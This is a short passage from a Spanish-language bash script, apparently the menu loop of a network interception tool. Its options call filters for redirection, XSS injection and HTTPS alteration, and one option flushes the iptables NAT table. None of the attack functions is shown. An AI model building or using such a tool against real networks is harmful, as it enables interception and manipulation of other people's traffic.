elif [ "$eleccion" = "Redirección" ]; then
filtro_redir;
elif [ "$eleccion" = "XSScripting" ]; then
filtro_img;
elif [ "$eleccion" = "Cambiar HTTPS" ]; then
filtro_txt;
elif [ "$eleccion" = "Limpiar IPTABLES" ]; then
sudo iptables -t nat --flush;


elif [ "$eleccion" = "Salir" ]; then
salida_x;
quit="yes";
else
exit 0
fi
done







